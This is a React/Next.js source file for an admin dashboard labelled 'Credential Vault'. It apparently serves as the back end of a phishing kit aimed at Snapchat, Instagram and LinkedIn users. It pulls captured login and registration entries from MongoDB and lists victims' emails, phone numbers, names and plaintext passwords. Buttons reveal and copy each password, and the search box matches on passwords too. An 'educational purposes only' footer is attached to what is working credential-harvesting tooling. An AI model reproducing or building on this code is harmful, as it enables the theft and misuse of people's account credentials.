"use client";

import { useState, useEffect } from "react";

type Entry = {
  _id: string;
  platform: string;
  firstName?: string;
  lastName?: string;
  email?: string;
  phone?: string;
  username?: string;
  password: string;
  createdAt: string;
  // login entries use 'email' field for identifier
};

const PLATFORM_CONFIG: Record<string, { color: string; bg: string; border: string; emoji: string; label: string }> = {
  snapchat: { color: "#000", bg: "#FFFC00", border: "#e6e300", emoji: "👻", label: "Snapchat" },
  instagram: { color: "#fff", bg: "linear-gradient(135deg,#fd5949,#d6249f,#285AEB)", border: "#d6249f", emoji: "📸", label: "Instagram" },
  linkedin:  { color: "#fff", bg: "#0A66C2", border: "#0855a3", emoji: "💼", label: "LinkedIn" },
  unknown:   { color: "#fff", bg: "#444", border: "#555", emoji: "❓", label: "Unknown" },
};

const TYPE_CONFIG = {
  login:    { color: "#4ade80", bg: "rgba(74,222,128,0.1)", border: "rgba(74,222,128,0.3)", label: "LOGIN" },
  register: { color: "#60a5fa", bg: "rgba(96,165,250,0.1)", border: "rgba(96,165,250,0.3)", label: "REGISTER" },
};

function PlatformBadge({ platform }: { platform: string }) {
  const cfg = PLATFORM_CONFIG[platform] || PLATFORM_CONFIG.unknown;
  return (
    <span style={{
      display: "inline-flex", alignItems: "center", gap: "5px",
      padding: "3px 10px", borderRadius: "20px", fontSize: "11px", fontWeight: 700,
      background: cfg.bg, color: cfg.color, border: `1px solid ${cfg.border}`,
      letterSpacing: "0.03em",
    }}>
      {cfg.emoji} {cfg.label}
    </span>
  );
}

function TypeBadge({ type }: { type: "login" | "register" }) {
  const cfg = TYPE_CONFIG[type];
  return (
    <span style={{
      display: "inline-flex", alignItems: "center",
      padding: "2px 8px", borderRadius: "4px", fontSize: "10px", fontWeight: 800,
      background: cfg.bg, color: cfg.color, border: `1px solid ${cfg.border}`,
      letterSpacing: "0.1em",
    }}>
      {cfg.label}
    </span>
  );
}

function CopyBtn({ text }: { text: string }) {
  const [copied, setCopied] = useState(false);
  return (
    <button
      onClick={() => { navigator.clipboard.writeText(text); setCopied(true); setTimeout(() => setCopied(false), 1500); }}
      style={{
        background: copied ? "rgba(74,222,128,0.15)" : "rgba(255,255,255,0.06)",
        border: `1px solid ${copied ? "rgba(74,222,128,0.4)" : "rgba(255,255,255,0.1)"}`,
        color: copied ? "#4ade80" : "rgba(255,255,255,0.5)",
        borderRadius: "5px", padding: "2px 8px", fontSize: "10px",
        cursor: "pointer", fontWeight: 600, transition: "all 0.2s", letterSpacing: "0.05em",
      }}
    >
      {copied ? "✓ COPIED" : "COPY"}
    </button>
  );
}

// Detect if it's a login entry or register entry
function detectType(entry: Entry): "login" | "register" {
  // Login entries saved via /api/login typically have minimal fields
  // Register entries have more fields like firstName, lastName, username
  if (entry.firstName || entry.lastName || entry.username || entry.phone) return "register";
  return "login";
}

function getIdentifier(entry: Entry): string {
  return entry.email || entry.username || entry.phone || "—";
}

export default function AdminPage() {
  const [entries, setEntries]     = useState<Entry[]>([]);
  const [loading, setLoading]     = useState(true);
  const [error, setError]         = useState("");
  const [search, setSearch]       = useState("");
  const [platFilter, setPlatFilter] = useState("all");
  const [typeFilter, setTypeFilter] = useState("all");
  const [showPass, setShowPass]   = useState<Record<string, boolean>>({});
  const [lastRefresh, setLastRefresh] = useState(new Date());

  async function fetchData() {
    setLoading(true);
    setError("");
    try {
      const res = await fetch("/api/admin");
      if (!res.ok) throw new Error("Failed to fetch");
      const data = await res.json();
      setEntries(data);
      setLastRefresh(new Date());
    } catch (e: any) {
      setError("MongoDB se data nahi aa raha. Check your connection.");
    }
    setLoading(false);
  }

  useEffect(() => { fetchData(); }, []);

  const filtered = entries.filter(e => {
    const type = detectType(e);
    const identifier = getIdentifier(e);
    const matchPlat = platFilter === "all" || e.platform === platFilter;
    const matchType = typeFilter === "all" || type === typeFilter;
    const matchSearch = !search ||
      identifier.toLowerCase().includes(search.toLowerCase()) ||
      e.password?.toLowerCase().includes(search.toLowerCase()) ||
      (e.firstName || "").toLowerCase().includes(search.toLowerCase()) ||
      (e.lastName || "").toLowerCase().includes(search.toLowerCase());
    return matchPlat && matchType && matchSearch;
  });

  const loginCount    = entries.filter(e => detectType(e) === "login").length;
  const registerCount = entries.filter(e => detectType(e) === "register").length;
  const snapCount     = entries.filter(e => e.platform === "snapchat").length;
  const igCount       = entries.filter(e => e.platform === "instagram").length;
  const liCount       = entries.filter(e => e.platform === "linkedin").length;

  const togglePass = (id: string) => setShowPass(p => ({ ...p, [id]: !p[id] }));

  return (
    <div style={{
      minHeight: "100vh",
      background: "#080808",
      fontFamily: "'Courier New', 'Courier', monospace",
      padding: "0",
    }}>

      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700;800&display=swap');
        * { box-sizing: border-box; }
        ::-webkit-scrollbar { width: 6px; height: 6px; }
        ::-webkit-scrollbar-track { background: #111; }
        ::-webkit-scrollbar-thumb { background: #333; border-radius: 3px; }
        @keyframes fadeIn { from{opacity:0;transform:translateY(8px)} to{opacity:1;transform:translateY(0)} }
        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.4} }
        .entry-row { animation: fadeIn 0.3s ease both; }
        .filter-btn { transition: all 0.15s; cursor: pointer; border: none; font-family: 'JetBrains Mono', monospace; }
        .filter-btn:hover { opacity: 0.85; }
        .refresh-btn:hover { background: rgba(255,255,255,0.1) !important; }
        input::placeholder { color: rgba(255,255,255,0.2); }
      `}</style>

      {/* TOP NAV */}
      <div style={{
        position: "sticky", top: 0, zIndex: 100,
        background: "rgba(8,8,8,0.95)", backdropFilter: "blur(10px)",
        borderBottom: "1px solid rgba(255,255,255,0.07)",
        padding: "14px 28px",
        display: "flex", alignItems: "center", justifyContent: "space-between",
      }}>
        <div style={{ display: "flex", alignItems: "center", gap: "12px" }}>
          <div style={{
            width: "8px", height: "8px", borderRadius: "50%",
            background: error ? "#f87171" : "#4ade80",
            animation: loading ? "pulse 1s infinite" : "none",
            boxShadow: error ? "0 0 8px #f87171" : "0 0 8px #4ade80",
          }} />
          <span style={{ color: "rgba(255,255,255,0.9)", fontSize: "13px", fontWeight: 700, letterSpacing: "0.15em", fontFamily: "'JetBrains Mono', monospace" }}>
            CREDENTIAL VAULT
          </span>
          <span style={{ color: "rgba(255,255,255,0.2)", fontSize: "11px", fontFamily: "'JetBrains Mono', monospace" }}>
            admin@localhost
          </span>
        </div>
        <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
          <span style={{ color: "rgba(255,255,255,0.2)", fontSize: "10px", fontFamily: "'JetBrains Mono', monospace" }}>
            Last sync: {lastRefresh.toLocaleTimeString()}
          </span>
          <button
            className="refresh-btn"
            onClick={fetchData}
            style={{
              background: "rgba(255,255,255,0.05)", border: "1px solid rgba(255,255,255,0.1)",
              color: "rgba(255,255,255,0.6)", borderRadius: "6px", padding: "6px 14px",
              fontSize: "11px", cursor: "pointer", fontFamily: "'JetBrains Mono', monospace",
              fontWeight: 600, letterSpacing: "0.08em", transition: "all 0.2s",
            }}
          >
            ↻ REFRESH
          </button>
        </div>
      </div>

      <div style={{ padding: "28px 28px 60px", maxWidth: "1200px", margin: "0 auto" }}>

        {/* STATS ROW */}
        <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(140px,1fr))", gap: "12px", marginBottom: "28px" }}>
          {[
            { label: "TOTAL", value: entries.length, color: "#fff" },
            { label: "LOGIN", value: loginCount, color: "#4ade80" },
            { label: "REGISTER", value: registerCount, color: "#60a5fa" },
            { label: "👻 SNAP", value: snapCount, color: "#FFFC00" },
            { label: "📸 INSTA", value: igCount, color: "#d6249f" },
            { label: "💼 LINKEDIN", value: liCount, color: "#0A66C2" },
          ].map(s => (
            <div key={s.label} style={{
              background: "rgba(255,255,255,0.03)", border: "1px solid rgba(255,255,255,0.07)",
              borderRadius: "10px", padding: "16px", textAlign: "center",
            }}>
              <div style={{ fontSize: "26px", fontWeight: 800, color: s.color, fontFamily: "'JetBrains Mono', monospace", lineHeight: 1 }}>
                {loading ? "—" : s.value}
              </div>
              <div style={{ fontSize: "9px", color: "rgba(255,255,255,0.3)", marginTop: "5px", letterSpacing: "0.15em", fontWeight: 700 }}>
                {s.label}
              </div>
            </div>
          ))}
        </div>

        {/* FILTERS ROW */}
        <div style={{
          background: "rgba(255,255,255,0.02)", border: "1px solid rgba(255,255,255,0.07)",
          borderRadius: "12px", padding: "16px 20px", marginBottom: "20px",
          display: "flex", flexWrap: "wrap", gap: "12px", alignItems: "center",
        }}>
          {/* Search */}
          <input
            value={search}
            onChange={e => setSearch(e.target.value)}
            placeholder="Search email, password, name..."
            style={{
              flex: "1", minWidth: "200px", background: "rgba(255,255,255,0.04)",
              border: "1px solid rgba(255,255,255,0.1)", borderRadius: "7px",
              padding: "9px 14px", color: "#fff", fontSize: "12px",
              outline: "none", fontFamily: "'JetBrains Mono', monospace",
            }}
          />

          {/* Platform filter */}
          <div style={{ display: "flex", gap: "6px", flexWrap: "wrap" }}>
            {[
              { key: "all", label: "ALL PLATFORMS" },
              { key: "snapchat",  label: "👻 SNAP" },
              { key: "instagram", label: "📸 INSTA" },
              { key: "linkedin",  label: "💼 LINKED" },
            ].map(f => (
              <button
                key={f.key}
                className="filter-btn"
                onClick={() => setPlatFilter(f.key)}
                style={{
                  padding: "7px 13px", borderRadius: "6px", fontSize: "10px", fontWeight: 700,
                  letterSpacing: "0.08em",
                  background: platFilter === f.key ? "rgba(255,255,255,0.12)" : "rgba(255,255,255,0.03)",
                  border: `1px solid ${platFilter === f.key ? "rgba(255,255,255,0.25)" : "rgba(255,255,255,0.08)"}`,
                  color: platFilter === f.key ? "#fff" : "rgba(255,255,255,0.4)",
                }}
              >
                {f.label}
              </button>
            ))}
          </div>

          {/* Type filter */}
          <div style={{ display: "flex", gap: "6px" }}>
            {[
              { key: "all",      label: "ALL TYPES" },
              { key: "login",    label: "LOGIN" },
              { key: "register", label: "REGISTER" },
            ].map(f => (
              <button
                key={f.key}
                className="filter-btn"
                onClick={() => setTypeFilter(f.key)}
                style={{
                  padding: "7px 13px", borderRadius: "6px", fontSize: "10px", fontWeight: 700,
                  letterSpacing: "0.08em",
                  background: typeFilter === f.key ? "rgba(255,255,255,0.12)" : "rgba(255,255,255,0.03)",
                  border: `1px solid ${typeFilter === f.key ? "rgba(255,255,255,0.25)" : "rgba(255,255,255,0.08)"}`,
                  color: typeFilter === f.key ? "#fff" : "rgba(255,255,255,0.4)",
                }}
              >
                {f.label}
              </button>
            ))}
          </div>
        </div>

        {/* RESULT COUNT */}
        <div style={{ marginBottom: "14px", display: "flex", justifyContent: "space-between", alignItems: "center" }}>
          <span style={{ fontSize: "11px", color: "rgba(255,255,255,0.25)", fontFamily: "'JetBrains Mono', monospace", letterSpacing: "0.08em" }}>
            {loading ? "Loading..." : `${filtered.length} records found`}
          </span>
          {search && (
            <button onClick={() => setSearch("")} style={{ background: "none", border: "none", color: "rgba(255,255,255,0.3)", cursor: "pointer", fontSize: "11px", fontFamily: "'JetBrains Mono', monospace" }}>
              ✕ clear search
            </button>
          )}
        </div>

        {/* ERROR */}
        {error && (
          <div style={{
            background: "rgba(248,113,113,0.08)", border: "1px solid rgba(248,113,113,0.25)",
            borderRadius: "10px", padding: "16px 20px", marginBottom: "20px",
            color: "#f87171", fontSize: "13px", fontFamily: "'JetBrains Mono', monospace",
          }}>
            ⚠️ {error}
          </div>
        )}

        {/* LOADING */}
        {loading && (
          <div style={{ textAlign: "center", padding: "60px", color: "rgba(255,255,255,0.2)", fontSize: "13px", fontFamily: "'JetBrains Mono', monospace", letterSpacing: "0.1em" }}>
            FETCHING FROM MONGODB...
          </div>
        )}

        {/* ENTRIES TABLE */}
        {!loading && !error && (
          <div style={{ display: "flex", flexDirection: "column", gap: "8px" }}>
            {filtered.length === 0 ? (
              <div style={{
                textAlign: "center", padding: "60px",
                color: "rgba(255,255,255,0.15)", fontSize: "13px",
                fontFamily: "'JetBrains Mono', monospace", letterSpacing: "0.1em",
              }}>
                NO RECORDS FOUND
              </div>
            ) : (
              filtered.map((entry, i) => {
                const type = detectType(entry);
                const identifier = getIdentifier(entry);
                const isPassVisible = showPass[entry._id];
                const cfg = PLATFORM_CONFIG[entry.platform] || PLATFORM_CONFIG.unknown;
                const date = new Date(entry.createdAt);

                return (
                  <div
                    key={entry._id}
                    className="entry-row"
                    style={{
                      animationDelay: `${i * 0.03}s`,
                      background: "rgba(255,255,255,0.02)",
                      border: "1px solid rgba(255,255,255,0.07)",
                      borderRadius: "10px",
                      padding: "16px 20px",
                      display: "grid",
                      gridTemplateColumns: "32px 110px 90px 1fr 1fr 1fr auto",
                      gap: "16px",
                      alignItems: "center",
                    }}
                  >
                    {/* Index */}
                    <div style={{ color: "rgba(255,255,255,0.15)", fontSize: "11px", fontFamily: "'JetBrains Mono', monospace", fontWeight: 600 }}>
                      {String(i + 1).padStart(2, "0")}
                    </div>

                    {/* Platform */}
                    <div><PlatformBadge platform={entry.platform} /></div>

                    {/* Type */}
                    <div><TypeBadge type={type} /></div>

                    {/* Identifier (email/phone/username) */}
                    <div>
                      <div style={{ fontSize: "9px", color: "rgba(255,255,255,0.25)", letterSpacing: "0.1em", marginBottom: "3px", fontFamily: "'JetBrains Mono', monospace" }}>
                        {entry.email ? "EMAIL" : entry.phone ? "PHONE" : "USERNAME"}
                      </div>
                      <div style={{ fontSize: "12px", color: "rgba(255,255,255,0.85)", fontFamily: "'JetBrains Mono', monospace", wordBreak: "break-all" }}>
                        {identifier}
                      </div>
                    </div>

                    {/* Name (for register) */}
                    <div>
                      {(entry.firstName || entry.lastName) ? (
                        <>
                          <div style={{ fontSize: "9px", color: "rgba(255,255,255,0.25)", letterSpacing: "0.1em", marginBottom: "3px", fontFamily: "'JetBrains Mono', monospace" }}>NAME</div>
                          <div style={{ fontSize: "12px", color: "rgba(255,255,255,0.7)", fontFamily: "'JetBrains Mono', monospace" }}>
                            {[entry.firstName, entry.lastName].filter(Boolean).join(" ")}
                          </div>
                        </>
                      ) : (
                        <span style={{ fontSize: "11px", color: "rgba(255,255,255,0.1)", fontFamily: "'JetBrains Mono', monospace" }}>—</span>
                      )}
                    </div>

                    {/* PASSWORD */}
                    <div>
                      <div style={{ fontSize: "9px", color: "rgba(255,255,255,0.25)", letterSpacing: "0.1em", marginBottom: "3px", fontFamily: "'JetBrains Mono', monospace" }}>PASSWORD</div>
                      <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
                        <span style={{
                          fontSize: "13px",
                          fontFamily: "'JetBrains Mono', monospace",
                          color: isPassVisible ? "#fbbf24" : "rgba(255,255,255,0.6)",
                          letterSpacing: isPassVisible ? "0.05em" : "0.2em",
                          fontWeight: isPassVisible ? 600 : 400,
                        }}>
                          {isPassVisible ? entry.password : "••••••••"}
                        </span>
                        <button
                          onClick={() => togglePass(entry._id)}
                          style={{
                            background: "none", border: "none", cursor: "pointer",
                            fontSize: "12px", padding: "0", lineHeight: 1, opacity: 0.5,
                          }}
                          title={isPassVisible ? "Hide" : "Show"}
                        >
                          {isPassVisible ? "🙈" : "👁"}
                        </button>
                        <CopyBtn text={entry.password} />
                      </div>
                    </div>

                    {/* Date + Time */}
                    <div style={{ textAlign: "right" }}>
                      <div style={{ fontSize: "10px", color: "rgba(255,255,255,0.25)", fontFamily: "'JetBrains Mono', monospace" }}>
                        {date.toLocaleDateString("en-IN", { day: "2-digit", month: "short", year: "2-digit" })}
                      </div>
                      <div style={{ fontSize: "10px", color: "rgba(255,255,255,0.15)", fontFamily: "'JetBrains Mono', monospace" }}>
                        {date.toLocaleTimeString("en-IN", { hour: "2-digit", minute: "2-digit" })}
                      </div>
                    </div>
                  </div>
                );
              })
            )}
          </div>
        )}

        {/* FOOTER */}
        <div style={{ marginTop: "40px", textAlign: "center", fontSize: "10px", color: "rgba(255,255,255,0.1)", fontFamily: "'JetBrains Mono', monospace", letterSpacing: "0.1em" }}>
          CREDENTIAL VAULT · FOR EDUCATIONAL PURPOSES ONLY · NOT FOR PRODUCTION USE
        </div>
      </div>
    </div>
  );
}